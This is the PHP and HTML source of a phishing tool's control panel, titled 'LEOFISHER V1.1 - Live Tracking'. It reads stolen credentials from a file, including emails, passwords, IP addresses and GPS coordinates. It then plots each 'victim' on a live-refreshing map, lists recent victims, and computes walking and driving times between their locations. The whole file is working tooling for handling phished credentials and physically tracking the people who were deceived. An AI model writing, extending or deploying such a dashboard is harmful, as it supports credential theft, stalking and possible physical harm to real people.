<?php
$creds = file_get_contents('creds.txt');
$victims = [];
if($creds) {
    foreach(explode("\n", trim($creds)) as $line) {
        if($line) {
            [$ip,$ua,$email,$pass,$gps,$time] = explode('|', $line);
            if($gps !== 'N/A') {
                $coords = json_decode($gps, true);
                if($coords && $coords['lat']) {
                    $victims[] = ['ip'=>$ip, 'email'=>$email, 'time'=>$time, 'lat'=>$coords['lat'], 'lng'=>$coords['lng']];
                }
            }
        }
    }
}

// Haversine distance (km)
function haversine($lat1, $lon1, $lat2, $lon2) {
    $R = 6371;
    $dLat = deg2rad($lat2 - $lat1);
    $dLon = deg2rad($lon2 - $lon1);
    $a = sin($dLat/2) * sin($dLat/2) + cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * sin($dLon/2) * sin($dLon/2);
    $c = 2 * atan2(sqrt($a), sqrt(1-$a));
    return $R * $c;
}

// Sort by time, calculate routes
usort($victims, fn($a,$b)=>strtotime($b['time']) - strtotime($a['time']));
$routes = [];
for($i=1; $i<count($victims); $i++) {
    $dist = haversine($victims[$i-1]['lat'], $victims[$i-1]['lng'], $victims[$i]['lat'], $victims[$i]['lng']);
    $walk_time = $dist / 5 * 60; // 5km/h walking
    $drive_time = $dist / 50 * 60; // 50km/h driving
    $routes[] = [
        'from' => $victims[$i-1], 'to' => $victims[$i],
        'dist' => round($dist,2), 'walk_min' => round($walk_time),
        'drive_min' => round($drive_time)
    ];
}
?>
<!DOCTYPE html><html><head>
<title>LEOFISHER Dashboard</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css"/>
<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css"/>
<style>body{font-family:monospace;background:#1a1a1a;color:#00ff00;padding:20px}
#map{height:600px;width:100%;border:2px solid #00ff00}
.victim-list{max-height:200px;overflow:auto;background:#000;padding:10px}
.route-info{color:#ffff00}</style>
</head><body>
<h1>🎣 LEOFISHER V1.1 - Live Tracking (<?php echo count($victims); ?> victims)</h1>
<div id="map"></div>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:20px">
<div>
<h3>Recent Victims</h3><div class="victim-list">
<?php foreach(array_slice($victims,0,10) as $v): ?>
<div><?php echo htmlspecialchars($v['ip'].' | '.$v['email'].' | '.date('H:i:s',strtotime($v['time']))); ?></div>
<?php endforeach; ?>
</div>
</div>
<div>
<h3>Routes & Distances</h3>
<div class="route-info">
<?php foreach(array_slice($routes,0,5) as $r): ?>
<div>
<?= $r['from']['ip'] ?> → <?= $r['to']['ip'] ?><br>
Dist: <?= $r['dist'] ?>km | Walk: <?= $r['walk_min'] ?>min | Drive: <?= $r['drive_min'] ?>min
</div>
<?php endforeach; ?>
</div>
</div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
<script>
var map = L.map('map',{zoomControl:true}).setView([0,0],2);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'&copy; OpenStreetMap'}).addTo(map);
var markers = L.markerClusterGroup({spiderfyOnMaxZoom:false,showCoverageOnHover:false});
<?php foreach($victims as $v): ?>
L.marker([<?= $v['lat'] ?>,<?= $v['lng'] ?>])
.bindPopup(`IP: <?= $v['ip'] ?><br>Email: <?= $v['email'] ?><br>Time: <?= $v['time'] ?>`)
.addTo(markers);
<?php endforeach; ?>
map.addLayer(markers);

// Draw routes
<?php foreach($routes as $r): ?>
L.polyline([
[<?= $r['from']['lat'] ?>,<?= $r['from']['lng'] ?>],
[<?= $r['to']['lat'] ?>,<?= $r['to']['lng'] ?>]
],{color:<?= rand(0,2)==0 ? "'#00ff00'" : rand(0,1)==0 ? "'#ffff00'" : "'#ff0000'" ?>}).addTo(map);
<?php endforeach; ?>

// Auto-refresh every 30s
setInterval(()=>{location.reload();},30000);
</script>
</body></html>
